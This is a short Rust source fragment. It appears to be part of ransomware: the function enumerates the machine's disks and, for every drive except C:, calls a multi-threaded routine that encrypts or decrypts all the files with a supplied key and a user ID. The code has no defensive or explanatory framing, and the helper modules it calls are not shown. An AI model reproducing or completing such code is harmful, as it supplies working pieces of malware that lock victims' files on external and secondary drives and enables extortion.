pub fn encrypt_decrypt_external_disks(private_public_key: String, user_id: String, is_encryption: u8) {
    let disks = crate::system::info::get_disks();

    for disk in disks {
        if disk != "C:\\" {
            super::file::multi_threaded_encrypt_decrypt_files(&disk, private_public_key.clone(), user_id.clone(), is_encryption);
        }
    }
}
